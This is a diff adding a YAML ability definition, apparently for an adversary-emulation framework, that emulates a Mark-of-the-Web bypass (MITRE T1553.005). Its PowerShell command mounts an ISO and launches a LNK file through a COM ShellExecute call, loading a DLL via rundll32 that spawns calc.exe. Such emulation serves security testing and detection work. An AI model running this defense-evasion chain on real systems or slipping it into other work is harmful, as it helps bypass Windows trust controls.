@@ -1,0 +1,26 @@
+---
+- id: d2e0c0165046372fcd5e2bf910eeb477
+  name: Execute LNK file from ISO
+  description: 'Executes LNK file document.lnk from AllTheThings.iso. Link file executes
+    cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from
+    the ISO which spawns calc.exe.
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1553.005
+    name: 'Subvert Trust Controls: Mark-of-the-Web Bypass'
+  platforms:
+    windows:
+      psh:
+        command: Mount-DiskImage -ImagePath "053c10_AllTheThings.iso" -StorageType
+          ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel "AllTheThings";
+          $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));
+          $instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
+        payloads:
+        - 053c10_AllTheThings.iso
+        - 053c10_AllTheThings.iso
+        cleanup: Dismount-DiskImage -ImagePath "053c10_AllTheThings.iso" | Out-Null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
